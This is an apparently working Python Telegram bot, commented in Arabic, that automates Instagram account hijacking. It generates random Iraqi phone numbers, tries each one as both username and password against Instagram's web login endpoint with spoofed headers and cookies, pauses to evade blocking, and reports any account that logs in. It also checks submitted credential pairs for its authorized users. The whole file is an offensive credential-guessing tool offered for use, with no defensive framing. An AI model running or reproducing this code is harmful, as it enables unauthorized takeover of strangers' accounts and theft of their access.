import os
import requests
import random
import time
from telethon import TelegramClient, events, Button

# Telegram bot settings
api_id = os.getenv('API_ID')  # تأكد من تعيينها في بيئة التشغيل
api_hash = os.getenv('API_HASH')  # تأكد من تعيينها في بيئة التشغيل
bot_token = os.getenv('BOT_TOKEN')  # تأكد من تعيينها في بيئة التشغيل
admin_id = int(os.getenv('ADMIN_ID'))  # تأكد من تعيينها في بيئة التشغيل

client = TelegramClient('bot', api_id, api_hash).start(bot_token=bot_token)

hunting_sessions = {}
authorized_users = set()

# Load authorized users from file
def load_authorized_users():
    try:
        with open("authorized_users.txt", "r") as file:
            for line in file:
                authorized_users.add(int(line.strip()))
    except FileNotFoundError:
        pass

# Save authorized users to file
def save_authorized_users():
    with open("authorized_users.txt", "w") as file:
        for user_id in authorized_users:
            file.write(f"{user_id}\n")

# Check Instagram login using credentials
def check_instagram_login(username, password):
    cookies = {
        'ig_did': '472E86DE-8910-4C69-9890-911D07AA8F54',
        'ig_nrcb': '1',
        'mid': 'ZeXFoAALAAF8QLNw4dTjYI_a9790',
        'csrftoken': 'wmqJZ5SeoN3CGP6Bxg0WAY1lzOAw2GXz',
    }

    headers = {
        'authority': 'www.instagram.com',
        'accept': '*/*',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.instagram.com',
        'referer': 'https://www.instagram.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36',
        'x-csrftoken': 'wmqJZ5SeoN3CGP6Bxg0WAY1lzOAw2GXz',
        'x-ig-app-id': '936619743392459',
        'x-instagram-ajax': '1012127503',
        'x-requested-with': 'XMLHttpRequest',
    }

    tim = str(time.time()).split('.')[0]
    data = {
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{tim}:{password}',
        'optIntoOneTap': 'false',
        'username': username,
    }

    response = requests.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', cookies=cookies, headers=headers, data=data)
    return 'userId' in response.text

# Start hunting process based on the chosen prefix
async def start_hunting(event, prefix):
    user_id = event.sender_id
    if user_id not in authorized_users:
        await event.reply("أنت غير مصرح لك باستخدام هذا البوت.")
        return

    hunting_sessions[user_id] = True
    account_checked_count = 0  # عداد الحسابات التي تم فحصها

    await event.reply(f"تم بدء عملية الصيد باستخدام المقدمة {prefix}!", buttons=[
        [Button.inline("إيقاف الصيد", b'stop_hunting')]
    ])

    while hunting_sessions.get(user_id, False):
        phone_number = generate_phone_number(prefix)
        password = phone_number  # Set the password to the phone number itself
        account_checked_count += 1  # زيادة عدد الحسابات التي تم فحصها
        await event.edit(f"فحص الحساب {account_checked_count}:\nرقم الحساب: {phone_number}\nكلمة المرور: {password}",
                        buttons=[[Button.inline("إيقاف الصيد", b'stop_hunting')]])

        if check_instagram_login(phone_number, password):
            await event.reply(f"تم العثور على حساب صالح: {phone_number} بكلمة مرور: {password}")
            break  # يمكنك إيقاف العملية بعد العثور على حساب صالح
        else:
            time.sleep(3)  # Delay to avoid being blocked

# Generate an Iraqi phone number based on the given prefix
def generate_phone_number(prefix):
    phone_number = prefix + random.choice('01234567') + ''.join(random.choices('0123456789', k=7))
    return phone_number

# Stop hunting process
async def stop_hunting(event):
    user_id = event.sender_id
    if user_id not in authorized_users:
        await event.reply("أنت غير مصرح لك باستخدام هذا البوت.")
        return

    hunting_sessions[user_id] = False
    await event.reply("تم إيقاف عملية الصيد!")

# Handle start command
@client.on(events.NewMessage(pattern='/start'))
async def start(event):
    user_id = event.sender_id
    if user_id == admin_id:
        await event.reply('مرحبًا! اختر العملية التي تريدها:', buttons=[
            [Button.inline("بدء الصيد بـ 077", b'start_077')],
            [Button.inline("بدء الصيد بـ 078", b'start_078')],
            [Button.inline("بدء الصيد بـ 075", b'start_075')],
            [Button.inline("إيقاف الصيد", b'stop_hunting')],
            [Button.inline("إضافة مستخدم", b'add_user')],
            [Button.inline("إزالة مستخدم", b'remove_user')],
            [Button.inline("عرض المستخدمين المصرح لهم", b'list_users')],
            [Button.inline("اختبار تسجيل الدخول", b'login_test')]  # زر اختبار تسجيل الدخول
        ])
    elif user_id in authorized_users:
        await event.reply('مرحبًا! اختر العملية التي تريدها:', buttons=[
            [Button.inline("بدء الصيد بـ 077", b'start_077')],
            [Button.inline("بدء الصيد بـ 078", b'start_078')],
            [Button.inline("بدء الصيد بـ 075", b'start_075')],
            [Button.inline("إيقاف الصيد", b'stop_hunting')],
            [Button.inline("اختبار تسجيل الدخول", b'login_test')]  # زر اختبار تسجيل الدخول
        ])
    else:
        await event.reply("أنت غير مصرح لك باستخدام هذا البوت. يرجى الاتصال بالمسؤول.\n@VPN50")

# Handle button callbacks
@client.on(events.CallbackQuery)
async def callback(event):
    data = event.data
    user_id = event.sender_id

    if data.startswith(b'start_'):
        if data == b'start_077':
            await start_hunting(event, '077')
        elif data == b'start_078':
            await start_hunting(event, '078')
        elif data == b'start_075':
            await start_hunting(event, '075')
    
    elif data == b'stop_hunting':
        await stop_hunting(event)
    
    elif data == b'add_user' and user_id == admin_id:
        await event.reply("أرسل معرف المستخدم الذي تريد إضافته:")
        
        @client.on(events.NewMessage(from_users=admin_id))
        async def add_user_handler(event):
            user_to_add = int(event.message.message)
            authorized_users.add(user_to_add)
            save_authorized_users()
            await event.reply(f"تم إضافة المستخدم {user_to_add} بنجاح.")
            client.remove_event_handler(add_user_handler)

    elif data == b'remove_user' and user_id == admin_id:
        await event.reply("أرسل معرف المستخدم الذي تريد إزالته:")
        
        @client.on(events.NewMessage(from_users=admin_id))
        async def remove_user_handler(event):
            user_to_remove = int(event.message.message)
            if user_to_remove in authorized_users:
                authorized_users.remove(user_to_remove)
                save_authorized_users()
                await event.reply(f"تم إزالة المستخدم {user_to_remove} بنجاح.")
            else:
                await event.reply(f"المستخدم {user_to_remove} غير موجود.")
            await client.remove_event_handler(remove_user_handler)

    elif data == b'login_test':
        await event.reply("أرسل اسم المستخدم وكلمة المرور بالتنسيق 'اسم المستخدم:كلمة المرور'.")

        @client.on(events.NewMessage(from_users=user_id))
        async def login_test_handler(event):
            credentials = event.message.message.split(":")
            if len(credentials) != 2:
                await event.reply("يرجى استخدام التنسيق الصحيح: 'اسم المستخدم:كلمة المرور'.")
                return
            
            username, password = credentials[0].strip(), credentials[1].strip()
            if check_instagram_login(username, password):
                await event.reply(f"تم تسجيل الدخول بنجاح: {username}")
            else:
                await event.reply(f"فشل تسجيل الدخول للحساب: {username}")

            # Stop the handler after checking once
            client.remove_event_handler(login_test_handler)

# Load authorized users on startup
load_authorized_users()
